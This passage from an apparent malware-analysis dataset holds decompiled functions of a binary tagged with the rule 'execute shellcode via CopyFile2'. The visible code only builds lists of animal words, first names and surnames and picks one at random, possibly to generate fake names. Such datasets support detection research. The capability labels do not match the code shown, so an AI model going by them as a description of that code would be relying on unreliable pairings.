apcStack220[2] = 0x401f2d;\n    fcn.00401cd0();\n    apcStack220[2] = 0x437564;\n    uStack88 = 0x15;\n    apcStack220[1] = 0x401f40;\n    fcn.00401cd0();\n    apcStack220[1] = \"beetle\";\n    uStack92 = 0x16;\n    apcStack220[0] = 0x401f53;\n    fcn.00401cd0();\n    apcStack220[0] = \"ladybird\";\n    cStack96 = '\\x17';\n    pcStack224 = 0x401f66;\n    fcn.00401cd0();\n    pcStack224 = \"duck\";\n    uStack100 = 0x18;\n    iStack228 = 0x401f79;\n    fcn.00401cd0();\n    iStack228 = 0x437544;\n    uStack104 = 0x19;\n    fcn.00401cd0();\n    uStack108 = 0x1a;\n    do {\n        iVar3 = fcn.0041aefd();\n        iVar3 = iVar3 % 0x1a;\n    } while (iVar3 == *0x4430a4);\n    iVar5 = 0x401fbc;\n    *0x4430a4 = iVar3;\n    iStack228 = fcn.004013a0(*(&stack0xffffff24 + iVar3 * 4) + -0x10);\n    iStack228 = iStack228 + 0x10;\n    uStack108 = CONCAT31(uStack108._1_3_, 0x1b);\n    if (cStack96 != '\\0') {\n        iVar5 = 0x437540;\n        fcn.004018f0(0x437540, 1);\n    }\n    ppiVar4 = iVar5 + -0x10;\n    iVar3 = fcn.004013a0(ppiVar4);\n    piVar2 = uStack108;\n    *uStack108 = iVar3 + 0x10;\n    uStack116 = 0x1a;\n    piVar1 = iVar5 + -4;\n    LOCK();\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar4 + 4))(ppiVar4);\n    }\n    uStack116 = 0;\n    fcn.0041b954(&stack0xffffff1c, 4, 0x1a, fcn.00401420);\n    *in_FS_OFFSET = pcStack140;\n    return piVar2;\n}\n",
        "token_count": 1883
    },
    "00402150": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00402150(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char **in_FS_OFFSET;\n    char *apcStack492 [4];\n    char *pcStack476;\n    char *pcStack472;\n    char *pcStack468;\n    char *pcStack464;\n    char *pcStack460;\n    char *pcStack456;\n    char *pcStack452;\n    char *pcStack448;\n    char *pcStack444;\n    char *pcStack440;\n    char *pcStack436;\n    char *pcStack432;\n    char *pcStack428;\n    char *pcStack424;\n    char *pcStack420;\n    char *pcStack416;\n    char *pcStack412;\n    char *pcStack408;\n    char *pcStack404;\n    char *pcStack400;\n    char *pcStack396;\n    char *pcStack392;\n    char *pcStack388;\n    char *pcStack384;\n    char *pcStack380;\n    char *pcStack376;\n    char *pcStack372;\n    char *pcStack368;\n    char *pcStack364;\n    char *pcStack360;\n    char *pcStack356;\n    char *pcStack352;\n    char *pcStack348;\n    char *pcStack344;\n    char *pcStack340;\n    char *pcStack336;\n    char *pcStack332;\n    char *pcStack328;\n    char *pcStack324;\n    char *pcStack320;\n    char *pcStack316;\n    char *pcStack312;\n    char *pcStack308;\n    char *pcStack304;\n    char *pcStack300;\n    char *pcStack296;\n    char *pcStack292;\n    char *pcStack288;\n    char *pcStack284;\n    char *pcStack280;\n    char *pcStack276;\n    char *pcStack272;\n    char *pcStack268;\n    char *pcStack264;\n    char *pcStack260;\n    uint uStack256;\n    uint32_t uStack244;\n    uchar uStack240;\n    uint uStack236;\n    uchar uStack232;\n    uchar uStack228;\n    uchar uStack224;\n    uchar uStack220;\n    uchar uStack216;\n    uchar uStack212;\n    uchar uStack208;\n    uchar uStack204;\n    uchar uStack200;\n    uchar uStack196;\n    uchar uStack192;\n    uchar uStack188;\n    uchar uStack184;\n    uchar uStack180;\n    uchar uStack176;\n    uchar uStack172;\n    uchar uStack168;\n    uchar uStack164;\n    uchar uStack160;\n    uchar uStack156;\n    uchar uStack152;\n    uchar uStack148;\n    uchar uStack144;\n    uchar uStack140;\n    uchar uStack136;\n    uchar uStack132;\n    uchar uStack128;\n    uchar uStack124;\n    uchar uStack120;\n    uchar uStack116;\n    uchar uStack112;\n    uchar uStack108;\n    uchar uStack104;\n    uchar uStack100;\n    uchar uStack96;\n    uchar uStack92;\n    uchar uStack88;\n    uchar uStack84;\n    uchar uStack80;\n    uchar uStack76;\n    uchar uStack72;\n    uchar uStack68;\n    uchar uStack64;\n    uchar uStack60;\n    uchar uStack56;\n    uchar uStack52;\n    uchar uStack48;\n    uchar uStack44;\n    uchar uStack40;\n    uchar uStack36;\n    uchar uStack32;\n    uchar uStack28;\n    uchar uStack24;\n    uchar uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4350ba;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    pcStack260 = \"James\";\n    uStack256 = 0;\n    pcStack264 = 0x402181;\n    fcn.00401cd0();\n    pcStack264 = \"John\";\n    uStack8 = 1;\n    pcStack268 = 0x40219a;\n    fcn.00401cd0();\n    pcStack268 = \"Robert\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    pcStack272 = 0x4021b0;\n    fcn.00401cd0();\n    pcStack272 = \"Michael\";\n    uStack16 = 3;\n    pcStack276 = 0x4021c6;\n    fcn.00401cd0();\n    pcStack276 = \"William\";\n    uStack20 = 4;\n    pcStack280 = 0x4021dc;\n    fcn.00401cd0();\n    pcStack280 = \"David\";\n    uStack24 = 5;\n    pcStack284 = 0x4021f2;\n    fcn.00401cd0();\n    pcStack284 = \"Richard\";\n    uStack28 = 6;\n    pcStack288 = 0x402208;\n    fcn.00401cd0();\n    pcStack288 = \"Charles\";\n    uStack32 = 7;\n    pcStack292 = 0x40221e;\n    fcn.00401cd0();\n    pcStack292 = \"Joseph\";\n    uStack36 = 8;\n    pcStack296 = 0x402234;\n    fcn.00401cd0();\n    pcStack296 = \"Thomas\";\n    uStack40 = 9;\n    pcStack300 = 0x40224a;\n    fcn.00401cd0();\n    pcStack300 = \"Christopher\";\n    uStack44 = 10;\n    pcStack304 = 0x402260;\n    fcn.00401cd0();\n    pcStack304 = \"Daniel\";\n    uStack48 = 0xb;\n    pcStack308 = 0x402276;\n    fcn.00401cd0();\n    pcStack308 = \"Paul\";\n    uStack52 = 0xc;\n    pcStack312 = 0x40228c;\n    fcn.00401cd0();\n    pcStack312 = \"Mark\";\n    uStack56 = 0xd;\n    pcStack316 = 0x4022a2;\n    fcn.00401cd0();\n    pcStack316 = \"Donald\";\n    uStack60 = 0xe;\n    pcStack320 = 0x4022b8;\n    fcn.00401cd0();\n    pcStack320 = \"George\";\n    uStack64 = 0xf;\n    pcStack324 = 0x4022ce;\n    fcn.00401cd0();\n    uStack68 = 0x10;\n    pcStack324 = \"Kenneth\";\n    pcStack328 = 0x4022e4;\n    fcn.00401cd0();\n    pcStack328 = \"Steven\";\n    uStack72 = 0x11;\n    pcStack332 = 0x4022fa;\n    fcn.00401cd0();\n    pcStack332 = \"Edward\";\n    uStack76 = 0x12;\n    pcStack336 = 0x402310;\n    fcn.00401cd0();\n    pcStack336 = \"Brian\";\n    uStack80 = 0x13;\n    pcStack340 = 0x402326;\n    fcn.00401cd0();\n    pcStack340 = \"Ronald\";\n    uStack84 = 0x14;\n    pcStack344 = 0x40233c;\n    fcn.00401cd0();\n    pcStack344 = \"Anthony\";\n    uStack88 = 0x15;\n    pcStack348 = 0x402352;\n    fcn.00401cd0();\n    pcStack348 = \"Kevin\";\n    uStack92 = 0x16;\n    pcStack352 = 0x402368;\n    fcn.00401cd0();\n    pcStack352 = \"Jason\";\n    uStack96 = 0x17;\n    pcStack356 = 0x40237e;\n    fcn.00401cd0();\n    pcStack356 = \"Matthew\";\n    uStack100 = 0x18;\n    pcStack360 = 0x402394;\n    fcn.00401cd0();\n    pcStack360 = \"Gary\";\n    uStack104 = 0x19;\n    pcStack364 = 0x4023aa;\n    fcn.00401cd0();\n    pcStack364 = \"Timothy\";\n    uStack108 = 0x1a;\n    pcStack368 = 0x4023c0;\n    fcn.00401cd0();\n    pcStack368 = \"Jose\";\n    uStack112 = 0x1b;\n    pcStack372 = 0x4023d6;\n    fcn.00401cd0();\n    pcStack372 = \"Larry\";\n    uStack116 = 0x1c;\n    pcStack376 = 0x4023ec;\n    fcn.00401cd0();\n    pcStack376 = \"Jeffrey\";\n    uStack120 = 0x1d;\n    pcStack380 = 0x402402;\n    fcn.00401cd0();\n    pcStack380 = \"Mary\";\n    uStack124 = 0x1e;\n    pcStack384 = 0x40241b;\n    fcn.00401cd0();\n    pcStack384 = \"Patricia\";\n    uStack128 = 0x1f;\n    pcStack388 = 0x402434;\n    fcn.00401cd0();\n    uStack132 = 0x20;\n    pcStack388 = \"Linda\";\n    pcStack392 = 0x40244d;\n    fcn.00401cd0();\n    pcStack392 = \"Barbara\";\n    uStack136 = 0x21;\n    pcStack396 = 0x402466;\n    fcn.00401cd0();\n    pcStack396 = \"Elizabeth\";\n    uStack140 = 0x22;\n    pcStack400 = 0x40247f;\n    fcn.00401cd0();\n    pcStack400 = \"Jennifer\";\n    uStack144 = 0x23;\n    pcStack404 = 0x402498;\n    fcn.00401cd0();\n    pcStack404 = \"Maria\";\n    uStack148 = 0x24;\n    pcStack408 = 0x4024b1;\n    fcn.00401cd0();\n    pcStack408 = \"Susan\";\n    uStack152 = 0x25;\n    pcStack412 = 0x4024ca;\n    fcn.00401cd0();\n    pcStack412 = \"Margaret\";\n    uStack156 = 0x26;\n    pcStack416 = 0x4024e3;\n    fcn.00401cd0();\n    pcStack416 = \"Dorothy\";\n    uStack160 = 0x27;\n    pcStack420 = 0x4024fc;\n    fcn.00401cd0();\n    pcStack420 = \"Lisa\";\n    uStack164 = 0x28;\n    pcStack424 = 0x402515;\n    fcn.00401cd0();\n    pcStack424 = \"Nancy\";\n    uStack168 = 0x29;\n    pcStack428 = 0x40252e;\n    fcn.00401cd0();\n    pcStack428 = \"Karen\";\n    uStack172 = 0x2a;\n    pcStack432 = 0x402547;\n    fcn.00401cd0();\n    pcStack432 = \"Betty\";\n    uStack176 = 0x2b;\n    pcStack436 = 0x402560;\n    fcn.00401cd0();\n    pcStack436 = \"Helen\";\n    uStack180 = 0x2c;\n    pcStack440 = 0x402579;\n    fcn.00401cd0();\n    pcStack440 = \"Sandra\";\n    uStack184 = 0x2d;\n    pcStack444 = 0x402592;\n    fcn.00401cd0();\n    pcStack444 = \"Donna\";\n    uStack188 = 0x2e;\n    pcStack448 = 0x4025ab;\n    fcn.00401cd0();\n    pcStack448 = \"Carol\";\n    uStack192 = 0x2f;\n    pcStack452 = 0x4025c4;\n    fcn.00401cd0();\n    uStack196 = 0x30;\n    pcStack452 = \"Ruth\";\n    pcStack456 = 0x4025dd;\n    fcn.00401cd0();\n    pcStack456 = \"Sharon\";\n    uStack200 = 0x31;\n    pcStack460 = 0x4025f6;\n    fcn.00401cd0();\n    pcStack460 = \"Michelle\";\n    uStack204 = 0x32;\n    pcStack464 = 0x40260f;\n    fcn.00401cd0();\n    pcStack464 = \"Laura\";\n    uStack208 = 0x33;\n    pcStack468 = 0x402628;\n    fcn.00401cd0();\n    pcStack468 = \"Sarah\";\n    uStack212 = 0x34;\n    pcStack472 = 0x402641;\n    fcn.00401cd0();\n    pcStack472 = \"Kimberly\";\n    uStack216 = 0x35;\n    pcStack476 = 0x40265a;\n    fcn.00401cd0();\n    pcStack476 = \"Deborah\";\n    uStack220 = 0x36;\n    apcStack492[3] = 0x402673;\n    fcn.00401cd0();\n    apcStack492[3] = \"Jessica\";\n    uStack224 = 0x37;\n    apcStack492[2] = 0x40268c;\n    fcn.00401cd0();\n    apcStack492[2] = \"Shirley\";\n    uStack228 = 0x38;\n    apcStack492[1] = 0x4026a5;\n    fcn.00401cd0();\n    apcStack492[1] = \"Cynthia\";\n    uStack232 = 0x39;\n    apcStack492[0] = 0x4026be;\n    fcn.00401cd0();\n    apcStack492[0] = \"Angela\";\n    uStack236 = CONCAT31(uStack236._1_3_, 0x3a);\n    fcn.00401cd0();\n    uStack240 = 0x3b;\n    fcn.00401cd0(\"Melissa\");\n    uStack244 = 0x3c;\n    do {\n        iVar2 = fcn.0041aefd();\n        iVar2 = iVar2 % 0x3c;\n    } while (iVar2 == *0x4430ac);\n    *0x4430ac = iVar2;\n    iVar2 = fcn.004013a0(*(&stack0xfffffe14 + iVar2 * 4) + -0x10);\n    piVar1 = uStack236;\n    *uStack236 = iVar2 + 0x10;\n    uStack244 = uStack244 & 0xffffff00;\n    fcn.0041b954(&stack0xfffffe14, 4, 0x3c, fcn.00401420);\n    *in_FS_OFFSET = pcStack268;\n    return piVar1;\n}\n",
        "token_count": 3406
    },
    "00402780": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00402780(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char **in_FS_OFFSET;\n    char *apcStack812 [4];\n    char *pcStack796;\n    char *pcStack792;\n    char *pcStack788;\n    char *pcStack784;\n    char *pcStack780;\n    char *pcStack776;\n    char *pcStack772;\n    char *pcStack768;\n    char *pcStack764;\n    char *pcStack760;\n    char *pcStack756;\n    char *pcStack752;\n    char *pcStack748;\n    char *pcStack744;\n    char *pcStack740;\n    char *pcStack736;\n    char *pcStack732;\n    char *pcStack728;\n    char *pcStack724;\n    char *pcStack720;\n    char *pcStack716;\n    char *pcStack712;\n    char *pcStack708;\n    char *pcStack704;\n    char *pcStack700;\n    char *pcStack696;\n    char *pcStack692;\n    char *pcStack688;\n    char *pcStack684;\n    char *pcStack680;\n    char *pcStack676;\n    uint uStack672;\n    char *pcStack668;\n    char *pcStack664;\n    char *pcStack660;\n    char *pcStack656;\n    char *pcStack652;\n    char *pcStack648;\n    char *pcStack644;\n    char *pcStack640;\n    char *pcStack636;\n    char *pcStack632;\n    char *pcStack628;\n    char *pcStack624;\n    char *pcStack620;\n    char *pcStack616;\n    char *pcStack612;\n    char *pcStack608;\n    char *pcStack604;\n    char *pcStack600;\n    char *pcStack596;\n    char *pcStack592;\n    char *pcStack588;\n    char *pcStack584;\n    char *pcStack580;\n    char *pcStack576;\n    char *pcStack572;\n    char *pcStack568;\n    char *pcStack564;\n    char *pcStack560;\n    char *pcStack556;\n    char *pcStack552;\n    char *pcStack548;\n    char *pcStack544;\n    char *pcStack540;\n    char *pcStack536;\n    char *pcStack532;\n    char *pcStack528;\n    char *pcStack524;\n    char *pcStack520;\n    char *pcStack516;\n    uint uStack512;\n    char *pcStack508;\n    char *pcStack504;\n    char *pcStack500;\n    char *pcStack496;\n    char *pcStack492;\n    char *pcStack488;\n    char *pcStack484;\n    char *pcStack480;\n    char *pcStack476;\n    char *pcStack472;\n    char *pcStack468;\n    char *pcStack464;\n    char *pcStack460;\n    char *pcStack456;\n    char *pcStack452;\n    char *pcStack448;\n    char *pcStack444;\n    char *pcStack440;\n    char *pcStack436;\n    char *pcStack432;\n    char *pcStack428;\n    char *pcStack424;\n    char *pcStack420;\n    uint uStack416;\n    uint32_t uStack404;\n    uchar uStack400;\n    uint uStack396;\n    uchar uStack392;\n    uchar uStack388;\n    uchar uStack384;\n    uchar uStack380;\n    uchar uStack376;\n    uchar uStack372;\n    uchar uStack368;\n    uchar uStack364;\n    uchar uStack360;\n    uchar uStack356;\n    uchar uStack352;\n    uchar uStack348;\n    uchar uStack344;\n    uchar uStack340;\n    uchar uStack336;\n    uchar uStack332;\n    uchar uStack328;\n    uchar uStack324;\n    uchar uStack320;\n    uchar uStack316;\n    uchar uStack312;\n    uchar uStack308;\n    uchar uStack304;\n    uchar uStack300;\n    uchar uStack296;\n    uchar uStack292;\n    uchar uStack288;\n    uchar uStack284;\n    uchar uStack280;\n    uchar uStack276;\n    uchar uStack272;\n    uchar uStack268;\n    uchar uStack264;\n    uchar uStack260;\n    uchar uStack256;\n    uchar uStack252;\n    uchar uStack248;\n    uchar uStack244;\n    uchar uStack240;\n    uchar uStack236;\n    uchar uStack232;\n    uchar uStack228;\n    uchar uStack224;\n    uchar uStack220;\n    uchar uStack216;\n    uchar uStack212;\n    uchar uStack208;\n    uchar uStack204;\n    uchar uStack200;\n    uchar uStack196;\n    uchar uStack192;\n    uchar uStack188;\n    uchar uStack184;\n    uchar uStack180;\n    uchar uStack176;\n    uchar uStack172;\n    uchar uStack168;\n    uchar uStack164;\n    uchar uStack160;\n    uchar uStack156;\n    uchar uStack152;\n    uchar uStack148;\n    uchar uStack144;\n    uchar uStack140;\n    uchar uStack136;\n    uchar uStack132;\n    uchar uStack128;\n    uchar uStack124;\n    uchar uStack120;\n    uchar uStack116;\n    uchar uStack112;\n    uchar uStack108;\n    uchar uStack104;\n    uchar uStack100;\n    uchar uStack96;\n    uchar uStack92;\n    uchar uStack88;\n    uchar uStack84;\n    uchar uStack80;\n    uchar uStack76;\n    uchar uStack72;\n    uchar uStack68;\n    uchar uStack64;\n    uchar uStack60;\n    uchar uStack56;\n    uchar uStack52;\n    uchar uStack48;\n    uchar uStack44;\n    uchar uStack40;\n    uchar uStack36;\n    uchar uStack32;\n    uchar uStack28;\n    uchar uStack24;\n    uchar uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4354f2;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    pcStack420 = \"Smith\";\n    uStack416 = 0;\n    pcStack424 = 0x4027b1;\n    fcn.00401cd0();\n    pcStack424 = \"Johnson\";\n    uStack8 = 1;\n    pcStack428 = 0x4027ca;\n    fcn.00401cd0();\n    pcStack428 = \"Williams\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    pcStack432 = 0x4027e0;\n    fcn.00401cd0();\n    pcStack432 = \"Jones\";\n    uStack16 = 3;\n    pcStack436 = 0x4027f6;\n    fcn.00401cd0();\n    pcStack436 = \"Brown\";\n    uStack20 = 4;\n    pcStack440 = 0x40280c;\n    fcn.00401cd0();\n    pcStack440 = \"Davis\";\n    uStack24 = 5;\n    pcStack444 = 0x402822;\n    fcn.00401cd0();\n    pcStack444 = \"Miller\";\n    uStack28 = 6;\n    pcStack448 = 0x402838;\n    fcn.00401cd0();\n    pcStack448 = \"Wilson\";\n    uStack32 = 7;\n    pcStack452 = 0x40284e;\n    fcn.00401cd0();\n    pcStack452 = \"Moore\";\n    uStack36 = 8;\n    pcStack456 = 0x402864;\n    fcn.00401cd0();\n    pcStack456 = \"Taylor\";\n    uStack40 = 9;\n    pcStack460 = 0x40287a;\n    fcn.00401cd0();\n    pcStack460 = \"Anderson\";\n    uStack44 = 10;\n    pcStack464 = 0x402890;\n    fcn.00401cd0();\n    pcStack464 = \"Thomas\";\n    uStack48 = 0xb;\n    pcStack468 = 0x4028a6;\n    fcn.00401cd0();\n    pcStack468 = \"Jackson\";\n    uStack52 = 0xc;\n    pcStack472 = 0x4028bc;\n    fcn.00401cd0();\n    pcStack472 = \"White\";\n    uStack56 = 0xd;\n    pcStack476 = 0x4028d2;\n    fcn.00401cd0();\n    pcStack476 = \"Harris\";\n    uStack60 = 0xe;\n    pcStack480 = 0x4028e8;\n    fcn.00401cd0();\n    pcStack480 = \"Martin\";\n    uStack64 = 0xf;\n    pcStack484 = 0x4028fe;\n    fcn.00401cd0();\n    uStack68 = 0x10;\n    pcStack484 = \"Thompson\";\n    pcStack488 = 0x402914;\n    fcn.00401cd0();\n    pcStack488 = \"Garcia\";\n    uStack72 = 0x11;\n    pcStack492 = 0x40292a;\n    fcn.00401cd0();\n    pcStack492 = \"Martinez\";\n    uStack76 = 0x12;\n    pcStack496 = 0x402940;\n    fcn.00401cd0();\n    pcStack496 = \"Robinson\";\n    uStack80 = 0x13;\n    pcStack500 = 0x402956;\n    fcn.00401cd0();\n    pcStack500 = \"Clark\";\n    uStack84 = 0x14;\n    pcStack504 = 0x40296c;\n    fcn.00401cd0();\n    pcStack504 = \"Rodriguez\";\n    uStack88 = 0x15;\n    pcStack508 = 0x402982;\n    fcn.00401cd0();\n    pcStack508 = \"Lewis\";\n    uStack92 = 0x16;\n    uStack512 = 0x402998;\n    fcn.00401cd0();\n    uStack512 = 0x437ab0;\n    uStack96 = 0x17;\n    pcStack516 = 0x4029ae;\n    fcn.00401cd0();\n    pcStack516 = \"Walker\";\n    uStack100 = 0x18;\n    pcStack520 = 0x4029c4;\n    fcn.00401cd0();\n    pcStack520 = \"Hall\";\n    uStack104 = 0x19;\n    pcStack524 = 0x4029da;\n    fcn.00401cd0();\n    pcStack524 = \"Allen\";\n    uStack108 = 0x1a;\n    pcStack528 = 0x4029f0;\n    fcn.00401cd0();\n    pcStack528 = \"Young\";\n    uStack112 = 0x1b;\n    pcStack532 = 0x402a06;\n    fcn.00401cd0();\n    pcStack532 = \"Hernandez\";\n    uStack116 = 0x1c;\n    pcStack536 = 0x402a1c;\n    fcn.00401cd0();\n    pcStack536 = \"King\";\n    uStack120 = 0x1d;\n    pcStack540 = 0x402a32;\n    fcn.00401cd0();\n    pcStack540 = \"Wright\";\n    uStack124 = 0x1e;\n    pcStack544 = 0x402a4b;\n    fcn.00401cd0();\n    pcStack544 = \"Lopez\";\n    uStack128 = 0x1f;\n    pcStack548 = 0x402a64;\n    fcn.00401cd0();\n    uStack132 = 0x20;\n    pcStack548 = \"Hill\";\n    pcStack552 = 0x402a7d;\n    fcn.00401cd0();\n    pcStack552 = \"Scott\";\n    uStack136 = 0x21;\n    pcStack556 = 0x402a96;\n    fcn.00401cd0();\n    pcStack556 = \"Green\";\n    uStack140 = 0x22;\n    pcStack560 = 0x402aaf;\n    fcn.00401cd0();\n    pcStack560 = \"Adams\";\n    uStack144 = 0x23;\n    pcStack564 = 0x402ac8;\n    fcn.00401cd0();\n    pcStack564 = \"Baker\";\n    uStack148 = 0x24;\n    pcStack568 = 0x402ae1;\n    fcn.00401cd0();\n    pcStack568 = \"Gonzalez\";\n    uStack152 = 0x25;\n    pcStack572 = 0x402afa;\n    fcn.00401cd0();\n    pcStack572 = \"Nelson\";\n    uStack156 = 0x26;\n    pcStack576 = 0x402b13;\n    fcn.00401cd0();\n    pcStack576 = \"Carter\";\n    uStack160 = 0x27;\n    pcStack580 = 0x402b2c;\n    fcn.00401cd0();\n    pcStack580 = \"Mitchell\";\n    uStack164 = 0x28;\n    pcStack584 = 0x402b45;\n    fcn.00401cd0();\n    pcStack584 = \"Perez\";\n    uStack168 = 0x29;\n    pcStack588 = 0x402b5e;\n    fcn.00401cd0();\n    pcStack588 = \"Roberts\";\n    uStack172 = 0x2a;\n    pcStack592 = 0x402b77;\n    fcn.00401cd0();\n    pcStack592 = \"Turner\";\n    uStack176 = 0x2b;\n    pcStack596 = 0x402b90;\n    fcn.00401cd0();\n    pcStack596 = \"Phillips\";\n    uStack180 = 0x2c;\n    pcStack600 = 0x402ba9;\n    fcn.00401cd0();\n    pcStack600 = \"Campbell\";\n    uStack184 = 0x2d;\n    pcStack604 = 0x402bc2;\n    fcn.00401cd0();\n    pcStack604 = \"Parker\";\n    uStack188 = 0x2e;\n    pcStack608 = 0x402bdb;\n    fcn.00401cd0();\n    pcStack608 = \"Evans\";\n    uStack192 = 0x2f;\n    pcStack612 = 0x402bf4;\n    fcn.00401cd0();\n    uStack196 = 0x30;\n    pcStack612 = \"Edwards\";\n    pcStack616 = 0x402c0d;\n    fcn.00401cd0();\n    pcStack616 = \"Collins\";\n    uStack200 = 0x31;\n    pcStack620 = 0x402c26;\n    fcn.00401cd0();\n    pcStack620 = \"Stewart\";\n    uStack204 = 0x32;\n    pcStack624 = 0x402c3f;\n    fcn.00401cd0();\n    pcStack624 = \"Sanchez\";\n    uStack208 = 0x33;\n    pcStack628 = 0x402c58;\n    fcn.00401cd0();\n    pcStack628 = \"Morris\";\n    uStack212 = 0x34;\n    pcStack632 = 0x402c71;\n    fcn.00401cd0();\n    pcStack632 = \"Rogers\";\n    uStack216 = 0x35;\n    pcStack636 = 0x402c8a;\n    fcn.00401cd0();\n    pcStack636 = \"Reed\";\n    uStack220 = 0x36;\n    pcStack640 = 0x402ca3;\n    fcn.00401cd0();\n    pcStack640 = \"Cook\";\n    uStack224 = 0x37;\n    pcStack644 = 0x402cbc;\n    fcn.00401cd0();\n    pcStack644 = \"Morgan\";\n    uStack228 = 0x38;\n    pcStack648 = 0x402cd5;\n    fcn.00401cd0();\n    pcStack648 = \"Bell\";\n    uStack232 = 0x39;\n    pcStack652 = 0x402cee;\n    fcn.00401cd0();\n    pcStack652 = \"Murphy\";\n    uStack236 = 0x3a;\n    pcStack656 = 0x402d07;\n    fcn.00401cd0();\n    pcStack656 = \"Bailey\";\n    uStack240 = 0x3b;\n    pcStack660 = 0x402d20;\n    fcn.00401cd0();\n    pcStack660 = \"Rivera\";\n    uStack244 = 0x3c;\n    pcStack664 = 0x402d39;\n    fcn.00401cd0();\n    pcStack664 = \"Cooper\";\n    uStack248 = 0x3d;\n    pcStack668 = 0x402d52;\n    fcn.00401cd0();\n    pcStack668 = \"Richardson\";\n    uStack252 = 0x3e;\n    uStack672 = 0x402d6b;\n    fcn.00401cd0();\n    uStack672 = 0x43795c;\n    uStack256 = 0x3f;\n    pcStack676 = 0x402d84;\n    fcn.00401cd0();\n    pcStack676 = \"Howard\";\n    uStack260 = 0x40;\n    pcStack680 = 0x402d9d;\n    fcn.00401cd0();\n    pcStack680 = \"Ward\";\n    uStack264 = 0x41;\n    pcStack684 = 0x402db6;\n    fcn.00401cd0();\n    pcStack684 = \"Torres\";\n    uStack268 = 0x42;\n    pcStack688 = 0x402dcf;\n    fcn.00401cd0();\n    pcStack688 = \"Peterson\";\n    uStack272 = 0x43;\n    pcStack692 = 0x402de8;\n    fcn.00401cd0();\n    pcStack692 = \"Gray\";\n    uStack276 = 0x44;\n    pcStack696 = 0x402e01;\n    fcn.00401cd0();\n    pcStack696 = \"Ramirez\";\n    uStack280 = 0x45;\n    pcStack700 = 0x402e1a;\n    fcn.00401cd0();\n    pcStack700 = \"James\";\n    uStack284 = 0x46;\n    pcStack704 = 0x402e33;\n    fcn.00401cd0();\n    pcStack704 = \"Watson\";\n    uStack288 = 0x47;\n    pcStack708 = 0x402e4c;\n    fcn.00401cd0();\n    pcStack708 = \"Brooks\";\n    uStack292 = 0x48;\n    pcStack712 = 0x402e65;\n    fcn.00401cd0();\n    pcStack712 = \"Kelly\";\n    uStack296 = 0x49;\n    pcStack716 = 0x402e7e;\n    fcn.00401cd0();\n    pcStack716 = \"Sanders\";\n    uStack300 = 0x4a;\n    pcStack720 = 0x402e97;\n    fcn.00401cd0();\n    pcStack720 = \"Price\";\n    uStack304 = 0x4b;\n    pcStack724 = 0x402eb0;\n    fcn.00401cd0();\n    pcStack724 = \"Bennett\";\n    uStack308 = 0x4c;\n    pcStack728 = 0x402ec9;\n    fcn.00401cd0();\n    pcStack728 = \"Wood\";\n    uStack312 = 0x4d;\n    pcStack732 = 0x402ee2;\n    fcn.00401cd0();\n    pcStack732 = \"Barnes\";\n    uStack316 = 0x4e;\n    pcStack736 = 0x402efb;\n    fcn.00401cd0();\n    pcStack736 = \"Ross\";\n    uStack320 = 0x4f;\n    pcStack740 = 0x402f14;\n    fcn.00401cd0();\n    pcStack740 = \"Henderson\";\n    uStack324 = 0x50;\n    pcStack744 = 0x402f2d;\n    fcn.00401cd0();\n    pcStack744 = \"Coleman\";\n    uStack328 = 0x51;\n    pcStack748 = 0x402f46;\n    fcn.00401cd0();\n    pcStack748 = \"Jenkins\";\n    uStack332 = 0x52;\n    pcStack752 = 0x402f5f;\n    fcn.00401cd0();\n    pcStack752 = \"Perry\";\n    uStack336 = 0x53;\n    pcStack756 = 0x402f78;\n    fcn.00401cd0();\n    pcStack756 = \"Powell\";\n    uStack340 = 0x54;\n    pcStack760 = 0x402f91;\n    fcn.00401cd0();\n    pcStack760 = \"Long\";\n    uStack344 = 0x55;\n    pcStack764 = 0x402faa;\n    fcn.00401cd0();\n    pcStack764 = \"Patterson\";\n    uStack348 = 0x56;\n    pcStack768 = 0x402fc3;\n    fcn.00401cd0();\n    pcStack768 = \"Hughes\";\n    uStack352 = 0x57;\n    pcStack772 = 0x402fdc;\n    fcn.00401cd0();\n    pcStack772 = \"Flores\";\n    uStack356 = 0x58;\n    pcStack776 = 0x402ff5;\n    fcn.00401cd0();\n    pcStack776 = \"Washington\";\n    uStack360 = 0x59;\n    pcStack780 = 0x40300e;\n    fcn.00401cd0();\n    pcStack780 = \"Butler\";\n    uStack364 = 0x5a;\n    pcStack784 = 0x403027;\n    fcn.00401cd0();\n    pcStack784 = \"Simmons\";\n    uStack368 = 0x5b;\n    pcStack788 = 0x403040;\n    fcn.00401cd0();\n    pcStack788 = \"Foster\";\n    uStack372 = 0x5c;\n    pcStack792 = 0x403059;\n    fcn.00401cd0();\n    pcStack792 = \"Gonzales\";\n    uStack376 = 0x5d;\n    pcStack796 = 0x403072;\n    fcn.00401cd0();\n    pcStack796 = \"Bryant\";\n    uStack380 = 0x5e;\n    apcStack812[3] = 0x40308b;\n    fcn.00401cd0();\n    apcStack812[3] = \"Alexander\";\n    uStack384 = 0x5f;\n    apcStack812[2] = 0x4030a4;\n    fcn.00401cd0();\n    apcStack812[2] = \"Russell\";\n    uStack388 = 0x60;\n    apcStack812[1] = 0x4030bd;\n    fcn.00401cd0();\n    uStack392 = 0x61;\n    apcStack812[1] = \"Griffin\";\n    apcStack812[0] = 0x4030d6;\n    fcn.00401cd0();\n    apcStack812[0] = 